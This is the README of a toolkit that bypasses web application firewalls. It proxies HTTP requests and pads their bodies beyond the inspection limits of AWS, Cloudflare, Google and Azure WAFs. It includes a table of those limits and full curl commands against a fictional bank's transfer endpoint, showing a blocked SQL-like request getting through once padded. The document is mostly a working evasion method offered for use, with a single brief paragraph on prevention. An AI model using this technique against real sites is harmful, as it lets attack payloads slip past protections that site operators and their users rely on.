# waf-btk

WAF Bypass Toolkit

## What does it do?

It is well documented that certain cloud provider WAF products have a payload size limitation. This project is an HTTP/HTTPS proxy that acts as a wrapper to evade WAF detection by padding request bodies enough to bypass inspection by those rules.

### Limits

| Provider     | Max payload inspected |
| ------------ | --------------------- |
| AWS WAF      | 8k                    |
| Cloudflare   | 128k                  |
| Google Armor | 8k                    |
| Azure WAF    | 128k                  |

## How to use it

### Start the proxy

```console
make run
2023/04/24 17:17:15 [info] start listening to 127.0.0.1:8888
...
```

### Set a custom request header

To pad a request on the fly, set the `waf-btk-padding` header to the size you want to pad to. The header will be stripped from the request.

The following example assumes you have an application protected by a WAF with a rule that blocks requests containing `SELECT * FROM` in the payload.

Example (blocked by WAF):

Replay a normal `application/json` request through the proxy.

```console
$ curl -k -x http://localhost:8888 'https://api.ghostbank.com/api/v3/transfer' \
  -H 'authority: api.ghostbank.com' \
  -H 'accept: application/json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: ghostbank=MTY4MTk4NzQ5M...Oj4UoQKVK1U=' \
  -H 'origin: https://ghostbank.com' \
  -H 'referer: https://ghostbank.com/' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
  --data-raw '{"account_to":102,"account_from":998,"amount":7,"query":"SELECT * FROM schema"}' \
  --compressed

{"error":"WAF block"}
```

Example (not blocked by WAF):

Specify the `waf-btk-padding` header (value is padded in multiples of 1K). To bypass the AWS WAF, use a value of `8` or greater. To bypass the Cloudflare WAF, use a value of `128` or greater.

```console
$ curl -k -x http://localhost:8888 'https://api.ghostbank.com/api/v3/transfer' \
  -H 'authority: api.ghostbank.com' \
  -H 'accept: application/json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'waf-btk-padding: 8' \
  -H 'cookie: ghostbank=MTY4MTk4NzQ5M...Oj4UoQKVK1U=' \
  -H 'origin: https://ghostbank.com' \
  -H 'referer: https://ghostbank.com/' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
  --data-raw '{"account_to":102,"account_from":998,"amount":7,"query":"SELECT * FROM schema"}' \
  --compressed

{"status":"ok"}
```

## How to prevent bypass

The simple way to prevent request padding bypass attacks is to just block/drop requests that exceed the size limit. However, this is not always possible/practical.

## What's next?

Some WAFs (including AWS WAF) also have limitations on the number of headers and cookies they will evaluate. Future updates to WAF-BTK will extend the padding functionality to headers and cookies as well.
